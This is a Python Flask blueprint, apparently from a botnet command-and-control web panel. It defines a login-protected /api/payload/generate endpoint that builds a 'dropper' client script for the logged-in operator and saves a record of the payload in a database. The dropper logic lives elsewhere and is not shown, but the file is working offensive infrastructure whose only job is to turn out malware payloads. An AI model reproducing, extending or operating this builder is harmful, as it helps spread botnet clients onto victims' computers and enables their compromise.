import os
import subprocess
from flask import Blueprint, request, redirect, url_for, flash
from flask_login import login_user, logout_user, current_user, login_required
from botnet import client
from botnet.dao import payload_dao

# Blueprint
payload = Blueprint('payload', __name__, url_prefix='/api/payload')

# Routes
@payload.route("/generate", methods=["POST"])
@login_required
def payload_generate():
	"""Generates custom client scripts."""

	# required fields
	payload_format = request.form.get('format')

	# write dropper to user's output directory and return client creation page
	try:
		outfile = client.main(current_user.username)
		filename = os.path.basename(outfile)
		# add payload to database
		payload_dao.add_user_payload(current_user.id, filename.split('.')[0], payload_format)
		return('Successfully generated payload: ' + os.path.basename(outfile), 'success')
	except Exception as e:
		print("Exception in api.routes.payload.payload_generate: " + str(e))
		return('Error: compilation timed out or failed.', 'error')